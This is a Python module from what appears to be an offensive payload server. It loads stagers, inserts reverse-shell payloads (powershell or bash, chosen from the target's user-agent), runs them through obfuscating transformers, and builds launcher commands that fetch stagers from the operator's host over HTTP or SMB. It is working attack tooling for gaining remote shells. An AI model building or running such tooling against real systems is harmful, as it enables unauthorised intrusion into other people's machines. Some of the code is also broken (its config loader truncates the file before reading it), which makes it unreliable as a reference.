import re
import os
import json
import logging as logger

from pathlib import Path
from colorama import Fore


PLACEHOLDER_L = "<<"
PLACEHOLDER_R = ">>"
PLACEHOLDER_REGEX = re.compile(rf"{PLACEHOLDER_L}[A-Z]+{PLACEHOLDER_R}")
PLACEHOLDER_SHELL = f"{PLACEHOLDER_L}SHELL{PLACEHOLDER_R}"
PLACEHOLDER_URL = f"{PLACEHOLDER_L}URL{PLACEHOLDER_R}"
PLACEHOLDER_SMB = f"{PLACEHOLDER_L}SMB{PLACEHOLDER_R}"
PLACEHOLDER_SHELLBIN = f"{PLACEHOLDER_L}SHELLBIN{PLACEHOLDER_R}"


class PayloadManagerConfig:
    def __init__(self):
        self.cvars = {}
        self.stagers = []
        self.shells = []
        self.launchers = []
        self.transformers = {}
        self.stager_folder = Path("./stagers/")
        self.serve_folder = None
        self.accept_uploads = True
        self.uploads_folder = None
        self.uploads_use_serve_folder = False


class PayloadManager:
    def __new__(cls):
        if not hasattr(cls, "instance"):
            cls.instance = super(PayloadManager, cls).__new__(cls)
            cls.instance.cfg = PayloadManagerConfig()
        return cls.instance

    @property
    def shell_count(self) -> int:
        return len(self.cfg.shells)

    @property
    def launcher_count(self) -> int:
        return len(self.cfg.launchers)

    @property
    def stager_count(self) -> int:
        return len(self.cfg.stagers)

    @property
    def transformer_count(self) -> int:
        return len(self.cfg.transformers)

    def save_config(self, config_path):
        logger.info(f'Saved config "{Fore.LIGHTYELLOW_EX}{config_path}{Fore.RESET}"')

        try:
            with open(config_path, "w+") as cfg_file:
                cfg_file.write(json.dumps(self.cfg.__dict__))
        except Exception as ex:
            logger.warning(
                f'Failed to save file "{Fore.LIGHTRED_EX}{config_path}{Fore.RESET}": {ex}'
            )

    def load_config(self, config_path):
        if config_path.exists():
            try:
                with open(config_path, "w+") as cfg_file:
                    self.cfg = json.loads(cfg_file.read())

                logger.info(
                    f'Loaded config "{Fore.LIGHTYELLOW_EX}{config_path}{Fore.RESET}"'
                )
            except Exception as ex:
                logger.warning(
                    f'Failed to load file "{Fore.LIGHTRED_EX}{config_path}{Fore.RESET}": {ex}'
                )
        else:
            logger.warning(
                f'Config file "{Fore.LIGHTRED_EX}{config_path}{Fore.RESET}" does not exist'
            )

    def transformer_register(self, cls, enabled=False):
        self.cfg.transformers[cls.__name__] = {"transformer": cls(), "enabled": enabled}

    def get_cvar(self, name: str):
        name = name.upper()
        return self.cfg.cvars[name] if name in self.cfg.cvars else None

    def set_cvar(self, name: str, value):
        self.cfg.cvars[name.upper()] = value

    def load_stagers(self, folder):
        self.cfg.stager_folder = folder
        self.cfg.stagers = []

        for stager in [
            self.stager_process_path(x.relative_to(folder))
            for x in get_all_files(folder)
        ]:
            if self.stager_validate(stager):
                self.cfg.stagers.append(stager)
            else:
                logger.warning(f'Invalid stager "{stager}"')

    def stager_process_path(self, stager_path: Path):
        return str(stager_path).replace("\\", "/").replace("//", "/")

    def stager_validate(self, stager: str) -> bool:
        return self.stager_get_path(stager) is not None

    def stager_exists(self, stager: str) -> bool:
        if stager.startswith("/"):
            stager = stager[1:]
        return stager.lower() in self.cfg.stagers

    def stager_get_path(self, stager: str) -> Path or None:
        if stager.startswith("/"):
            stager = stager[1:]

        p = Path(self.cfg.stager_folder, stager)
        return p if p.exists() else None

    def stager_get_content(self, stager: str) -> str or None:
        stager_path = self.stager_get_path(stager)

        if stager_path:
            with open(stager_path) as stager_file:
                return stager_file.read()

        return None

    def load_shells(self, shells_json):
        self.cfg.shells = json.loads(shells_json)

    def shell_exists(self, shell: str) -> bool:
        return (shell.lower() in self.cfg.shells) if shell else False

    def shell_get_payload(self, shell: str) -> str or None:
        if self.shell_exists(shell):
            return self.cfg.shells[shell]["payload"]
        return None

    def tranformer_switch(self, transformer, status=None):
        if transformer in self.cfg.transformers:
            if status is None:
                self.cfg.transformers[transformer][
                    "enabled"
                ] = not self.cfg.transformers[transformer]["enabled"]
            else:
                self.cfg.transformers[transformer]["enabled"] = status

            if self.cfg.transformers[transformer]["enabled"]:
                logger.info(f"{transformer} {Fore.LIGHTGREEN_EX}enabled{Fore.RESET}")
            else:
                logger.info(f"{transformer} {Fore.LIGHTRED_EX}disabled{Fore.RESET}")
        else:
            logger.warning(f'Tranformer named "{transformer}" does not exist')

    def get_cvars_str(self, s: str):
        for cvar in PLACEHOLDER_REGEX.findall(s):
            yield cvar.replace(PLACEHOLDER_L, "").replace(PLACEHOLDER_R, "").upper()

    def get_cvars_shell(self, shell: str):
        shell_payload = self.shell_get_payload(shell)

        if shell_payload:
            for cvar in self.get_cvars_str(shell_payload):
                yield cvar

    def get_cvars(self, stager: str, shell: str = None):
        stager_path = self.stager_get_path(stager)

        if stager_path:
            with open(self.stager_get_path(stager)) as stager_file:
                for cvar in self.get_cvars_str(stager_file.read()):
                    yield cvar

            for cvar in self.get_cvars_shell(shell):
                yield cvar

    def insert_cvar(self, cvar, payload):
        val = self.get_cvar(cvar)

        if val:
            if not isinstance(val, str):
                val = str(val)

            logger.debug(f'CVAR {cvar} -> "{val}"')
            payload = payload.replace(f"{PLACEHOLDER_L}{cvar}{PLACEHOLDER_R}", val)
        else:
            logger.warning(f'Missing CVAR for shell: "{cvar}"')

        return payload

    def build_payload(self, stager: str, user_agent: str = None) -> str or None:
        shell = ""
        stager_path = self.stager_get_path(stager)

        if stager_path:
            stager_content = self.stager_get_content(stager)

            # insert shell and apply transformers
            shell_inserted = False

            if PLACEHOLDER_SHELL in stager_content:
                shell = self.get_cvar("SHELL")
                shell_payload = self.shell_get_payload(shell)

                if not shell_payload:
                    logger.warning("Stager requested a shell but none was given!")

                    try:
                        possible_os = user_agent.split("(")[1].split(" ")[0].lower()
                        logger.warning(
                            f"OS detected by user-agent: {Fore.LIGHTYELLOW_EX}{possible_os}{Fore.RESET}"
                        )

                        # try to auto select a suiteable shell
                        if possible_os == "windows":
                            shell = "powershell_simple"
                        elif possible_os == "linux":
                            shell = "bash_simple"
                        else:
                            shell = ""

                        if not shell == "":
                            shell_payload = self.shell_get_payload(shell)

                            if shell_payload:
                                logger.warning(
                                    f"Auto-selected shell: {Fore.LIGHTYELLOW_EX}{shell}{Fore.RESET}"
                                )
                            else:
                                logger.warning("No suiteable shell found")

                    except:
                        logger.warning("Failed to auto-select a shell by user-agent")

                if shell_payload:
                    # insert all the shell cvars, because they might become unreadable during transformation
                    for cvar in self.get_cvars_str(shell_payload):
                        shell_payload = self.insert_cvar(cvar, shell_payload)

                    # apply the transformers on shell
                    for transformer in self.cfg.transformers.keys():
                        t = self.cfg.transformers[transformer]

                        if t["enabled"]:
                            tr = t["transformer"]
                            stager_content = tr.trim_chars(
                                stager_content, PLACEHOLDER_SHELL
                            )
                            shell_payload = tr.transform(shell_payload)

                    logger.debug(f"SHELL -> {shell}")
                    stager_content = stager_content.replace(
                        PLACEHOLDER_SHELL, shell_payload
                    )
                    shell_inserted = True

            # insert all the remaining cvars
            for cvar in self.get_cvars(stager, shell):
                if cvar == "SHELL" and shell_inserted:
                    continue

                stager_content = self.insert_cvar(cvar, stager_content)

            return stager_content
        return None

    def load_launchers(self, launchers_json):
        self.cfg.launchers = json.loads(launchers_json)

    def launcher_exists(self, launcher: str) -> bool:
        return (launcher.lower() in self.cfg.launchers) if launcher else False

    def launcher_get_payload(self, launcher: str) -> str or None:
        if self.launcher_exists(launcher):
            return self.cfg.launchers[launcher]["payload"]
        return None

    def launcher_generate(self, launcher, stager, smb_share):
        payload = self.launcher_get_payload(launcher)

        if payload:
            lhost = self.get_cvar("LHOST")
            payload = payload.replace(PLACEHOLDER_SHELLBIN, self.get_cvar("SHELLBIN"))

            if PLACEHOLDER_URL in payload:
                url = f"http://{lhost}/{stager}"
                return payload.replace(PLACEHOLDER_URL, url)
            elif PLACEHOLDER_SMB in payload:
                # TODO: handle custom samba serving, this does not work at the moment
                smb = f"\\\\{lhost}\\{smb_share}\\{stager}"
                return payload.replace(PLACEHOLDER_SMB, smb)
            else:
                logger.warning(
                    "Launcher contains no valid placeholder (<<URL> or <<SMB>>)"
                )
        else:
            logger.warning(f'Launcher named "{launcher}" does not exist')

        return None


def get_all_files(path: str or Path):
    if not isinstance(path, Path):
        path = Path(path)

    if path.exists():
        for currentpath, _, files in os.walk(path):
            for file in files:
                yield Path(currentpath, file)
